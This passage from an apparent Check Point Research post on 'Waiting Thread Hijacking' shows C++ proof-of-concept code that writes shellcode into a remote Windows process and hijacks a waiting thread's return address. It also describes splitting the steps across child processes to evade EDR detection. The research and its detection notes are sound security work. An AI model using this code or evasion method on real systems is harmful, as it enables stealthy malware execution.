                std::cout << "\tUsing as a target!\n";
                break;
            }
        }
        else {
            std::cout << "TID: " << itr->first << "is NOT waiting, State: " << info.ext.state << "\n";
        }
    }
    bool is_injected = false;
    if (suitable_ret_ptr) {
        // overwrite the shellcode with the jump back
        SIZE_T written = 0;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, &suitable_ret, sizeof(suitable_ret), &written) && written == sizeof(suitable_ret)) {
            std::cout << "Shellcode ptr overwritten! Written: " << written << " \n";
        }
        else {
            std::cout << "Failed to overwrite shellcode jmp back: " << std::hex << GetLastError() << "\n";
            return false;
        }
        if (!protect_memory(pid, (LPVOID)shellcodePtr, sizeof(g_payload), PAGE_EXECUTE_READ)) {
            std::cerr << "Failed making memory executable!\n";
            return false;
        }

        shellcodePtr += 0x8; // after the saved return...
        std::cout << "Trying to overwrite: " << std::hex << suitable_ret_ptr << " -> " << suitable_ret << " with: " << shellcodePtr << std::endl;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)suitable_ret_ptr, &shellcodePtr, sizeof(shellcodePtr), &written) && written == sizeof(shellcodePtr)) {
            std::cout << "Ret overwritten!\n";
            is_injected = true;
        }
    }
    CloseHandle(hProcess);
    return is_injected;
}

bool execute_injection(DWORD processID)
{
    LPVOID shellcodePtr = NULL;

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
        if (!hProcess) return false;

        shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, sizeof(g_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        CloseHandle(hProcess);
        if (!shellcodePtr) return false;
    }

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);
        if (!hProcess) return false;

        SIZE_T written = 0;
        bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, g_payload, sizeof(g_payload), &written);
        CloseHandle(hProcess);
        if (!isOk) return false;
    }
    return run_injected(processID, (ULONG_PTR)shellcodePtr, WrQueue);
}
```

The complete source code of the [PoC is available on GitHub](https://github.com/hasherezade/waiting_thread_hijacking).

# Demo

Demo on Windows 11 24H2

Source code:

[https://github.com/hasherezade/waiting\_thread\_hijacking](https://github.com/hasherezade/waiting_thread_hijacking)

# Execution flow obfuscation

Some products base their detection on behavioral signatures, which consist of sequences of API calls made in conjunction. While a single write done to a remote process might get a pass, if the same process makes other interesting calls, it may create a marker of an injection technique.

One way to throw off process-centric behavioral signatures is to apply a simple obfuscation and split each step of our technique into a different child process.

In this model, allocation with read-write access is executed by the first process. The allocated address is then stored in an environment variable and passed to the next child process, which fills the new memory area with content. Then, the final child process changes the access rights of the allocated memory to read-execute. The last child process replaces the return pointer of the waiting thread, redirecting it to the previously written shellcode.

We can also split the execution into three steps instead of four, if we’re willing to accept a small concurrency risk. Using Waiting Thread Hijacking, the execution of the implant is not instantaneous and instead depends on a received event. So, making the shellcode executable can be done as the last step, after the pointer on the stack was already replaced.

A demo enriched with this obfuscation method is available when compiling the PoC with a flag: `SPLIT_STEPS`.

# Conclusion

Waiting Thread Hijacking relies on writing to a remote process. However, some Endpoint Detection and Response (EDR) systems may prevent any attempt at remote write, effectively thwarting this technique.

To overcome these limitations, it would be best to use an unconventional write (as demonstrated in the blog about Thread Name-Calling). But here comes the chicken-and-egg problem: to do so, we need to execute remotely some API. So, it defeats the purpose of this technique, which is stealthy execution. Techniques like [NINA](https://undev.ninja/nina-x64-process-injection/) and [GhostWriting](https://blog.sevagas.com/IMG/pdf/code_injection_series_part5.pdf) try to solve the write problem without using APCs (Asynchronous Procedure Calls), but they come with their own trade-offs. For example, they make use of [SetThreadContext](https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d), which is still detectable and blocked by many EDR systems.

On the other hand, there are some products that are very restrictive about remote execution methods but more lenient about allocations and writes. In such cases, WTH can still be effective in hiding the point at which the implanted code was run, remaining undetected despite using a common write primitive.

Different EDRs have different mechanisms of working, and by diversifying the arsenal of techniques, we can increase our success ratio in Red Teaming endeavors. Using WTH we were able to bypass some EDRs that stopped Thread Name-Calling. However, the opposite effect also occurred. No injection technique is perfect; each has its pros and cons, and as always, we are forced to trade off one suspicious indicator against another.

This technique doesn’t use rare APIs or sophisticated structures. Thanks to this simplicity, it’s easy to implement, but harder to detect by statically analyzing the sample, i.e. using YARA rules. All used APIs occur commonly in benign executables as well. The best way to catch it is by watching behavior, stopping remote writes immediately, or examining where they lead.

_**Check Point customers remain protected from the threats described in this research.**_

_**Check Point’s [Harmony Endpoint](https://www.checkpoint.com/harmony/advanced-endpoint-protection/) provides comprehensive endpoint protection at the highest security level, crucial to avoid security breaches and data compromise. Behavioral Guard protections were developed and deployed to protect customers against the threats described in this research.**_

**Harmony Endpoint protections:**

_WaitingThreadHijackBlock_

# References

Compendiums of known process injection techniques:

- [https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf](https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf)
- [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [https://attack.mitre.org/techniques/T1055/](https://attack.mitre.org/techniques/T1055/)
- [https://www.ired.team/offensive-security/code-injection-process-injection](https://www.ired.team/offensive-security/code-injection-process-injection)

On Classic Thread Hijacking:

- [https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking](https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking)

On derivatives of Thread Hijacking:

- [https://infosecwriteups.com/t-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca](https://infosecwriteups.com/t-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca)

On SetThreadContext and the alerts that it triggers:

- [https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d](https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d)

On Waiting Threads and Thread Pool:

- [https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/](https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/)
- [https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=6](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=6)

Using Thread Pool for injections:

- [https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/](https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/)
- [https://i.blackhat.com/EU-23/Presentations/EU-23-Leviev-The-Pool-Party-You-Will-Never-Forget.pdf](https://i.blackhat.com/EU-23/Presentations/EU-23-Leviev-The-Pool-Party-You-Will-Never-Forget.pdf)
- [https://vvinoth.com/post/threadpools/](https://vvinoth.com/post/threadpools/)

Another technique taking advantage of waiting threads:

- [https://www.unknowncheats.me/forum/anti-cheat-bypass/261176-silentjack-ultimate-handle-hijacking-user-mode-multi-ac-bypass-eac-tested.html](https://www.unknowncheats.me/forum/anti-cheat-bypass/261176-silentjack-ultimate-handle-hijacking-user-mode-multi-ac-bypass-eac-tested.html)

[![](https://research.checkpoint.com/wp-content/uploads/2022/10/back_arrow.svg)\\
\\
\\
GO UP](https://research.checkpoint.com/2025/waiting-thread-hijacking/#single-post)

[BACK TO ALL POSTS](https://research.checkpoint.com/latest-publications/)

## POPULAR POSTS

[![](https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg)](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

- Artificial Intelligence
- ChatGPT
- Check Point Research Publications

[OPWNAI : Cybercriminals Starting to Use ChatGPT](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

[![](https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg)](https://research.checkpoint.com/2019/hacking-fortnite/)

- Check Point Research Publications
- Threat Research

[Hacking Fortnite Accounts](https://research.checkpoint.com/2019/hacking-fortnite/)

[![](https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg)](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

- Artificial Intelligence
- ChatGPT
- Check Point Research Publications

[OpwnAI: AI That Can Save the Day or HACK it Away](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

### BLOGS AND PUBLICATIONS

[![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg)](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

- Check Point Research Publications

August 11, 2017

### “The Next WannaCry” Vulnerability is Here

[![](https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg)](https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/)

- Check Point Research Publications

January 11, 2018

### ‘RubyMiner’ Cryptominer Affects 30% of WW Networks

[![](https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg)](https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/)

- Check Point Research Publications
- Global Cyber Attack Reports
- Threat Research

February 17, 2020

### “The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign

[![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg)](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

- Check Point Research Publications

August 11, 2017

### “The Next WannaCry” Vulnerability is Here

[![](https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg)](https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/)

- Check Point Research Publications

January 11, 2018

### ‘RubyMiner’ Cryptominer Affects 30% of WW Networks

[![](https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg)](https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/)

- Check Point Research Publications
- Global Cyber Attack Reports
- Threat Research

February 17, 2020

### “The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign

[![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg)](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

- Check Point Research Publications

August 11, 2017

### “The Next WannaCry” Vulnerability is Here

- 1
- 2
- 3

## We value your privacy!

BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.

ACCEPT

REJECT